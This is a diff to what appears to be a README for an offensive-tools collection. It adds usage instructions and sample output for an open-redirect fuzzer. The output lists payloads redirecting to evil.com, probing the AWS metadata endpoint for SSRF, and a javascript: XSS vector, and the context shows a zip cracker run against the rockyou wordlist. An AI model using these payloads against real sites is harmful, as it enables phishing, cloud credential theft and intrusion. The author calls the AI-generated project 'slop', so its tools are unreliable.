@@ -213,6 +213,26 @@ x86_64-w64-mingw32-gcc -O3 -o zipcrack.exe zipcrack.c -lpthread
 ./zipcrack backup.zip /usr/share/wordlists/rockyou.txt
 </pre>
 
+14. Open Redirect Fuzzer
+
+<pre>
+# Linux / macOS / WSL
+gcc -O3 -o openredirect openredirect.c -lssl -lcrypto -lpthread
+
+# Windows (cross-compile)
+x86_64-w64-mingw32-gcc -O3 -o openredirect.exe openredirect.c -lssl -lcrypto -lpthread
+
+# Use it
+./openredirect https://login.target.com/redirect?url=
+./openredirect http://intranet/callback?return_url=
+
+[+] OPEN REDIRECT → https://login.target.com/redirect?url=//evil.com
+    → Classic open redirect (CRITICAL)
+[+] OPEN REDIRECT → https://login.target.com/redirect?url=//169.254.169.254/latest/meta-data/
+    → AWS metadata SSRF possible!
+[+] OPEN REDIRECT → https://login.target.com/redirect?url=javascript:alert(document.domain)
+    → XSS via open redirect!
+</pre>
 
 > P.S. I used Grok because of unrestricted tokens, no rate limits and premium subscription required. Grok was always so smart. Highly underestimated. This project has been birthed during Thanksgiving weekend. I hope everyone is thankful for such awesome slop.
 
